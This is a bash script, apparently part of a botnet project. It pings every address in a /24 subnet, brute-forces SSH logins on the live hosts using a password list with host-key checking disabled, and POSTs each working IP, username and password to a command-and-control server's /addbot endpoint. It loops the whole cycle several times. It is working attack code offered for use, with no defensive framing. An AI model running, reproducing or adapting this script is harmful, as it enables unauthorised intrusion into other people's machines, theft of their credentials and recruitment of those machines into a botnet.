#!/bin/bash

source ./.config

val=""
echo $destIP > temp.txt
val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" temp.txt)
ip=$(grep -ohE "([0-9]{1,3}\.){3}" temp.txt)
echo $ip
if [[ $val == "" ]]
then
	echo " enter a valid IP address"
	echo "please enter the IP ID in the form of x.x.x"
        echo "this program handles only /24 subnet values"
	exit
else
	echo "trying with $ip.0/24"
fi
rm temp.txt

# Scan network helper
is_alive_ping()
{
	ping -c 1 $1 > /dev/null
	[ $? -eq 0 ] && echo $i
}

# scan network main 
nwscan()
{
	for i in $1{2..254}
	do
		is_alive_ping $i & disown
	done
}


# brute force try to ssh into the machine main function
sshTry()
{
	INPUT=./botnet/password.csv
	OUTPUTFILE=userPassIPFile.txt
	OLDIFS=$IFS
	IFS=','
	uname=""
	pass=""

	[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
	while read username password
	do
		trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";return' INT
		uname=$username
		pass=$password
		echo "trying $username and $password."
		sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &>/dev/null
		if [ $? -eq 0 ]
		then
			echo "Username : $username"
			echo "Password : $password"
			break
		fi
	done < $INPUT
	IFS=$OLDIFS
	val=$1,$uname,$pass
	if [[ $uname == "NA" ]]
	then
		echo ""
		echo "user name and password not found for $1"
		echo ""
		# exit 0
	else
		curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
		echo "$val added"
	fi
}



n=1
k=1
while (($n <=5 ))
do
	trap 'echo ""; echo"" ;echo "Terminated by the user";rm ips.txt; echo"";echo "exiting this $1";exit 0' INT
	echo ""
	echo ""
	echo "running the script for the $k th time"
	echo ""
	echo ""
	echo "Scanning the Network"

	nwscan $ip > ips.txt
	
	echo ""
	echo ""
	echo "Devices on the network"
	sleep 2
	cat ips.txt

	echo ""
	echo ""
	echo "SSH attempt"
	echo ""

	while IFS= read -r line; do
		echo "Brute forcing the device with IP $line"
		sshTry $line
		echo ""
		echo ""
	done < ips.txt

	echo "Completed!!"
	sleep 1
	echo "IP , User name , Passwords are"
	
	python3 command_helper.py
	
	k=($k + 1)
	echo "about to retart in few seconds"
	sleep 4
	echo ""
	echo ""
	rm ips.txt
done
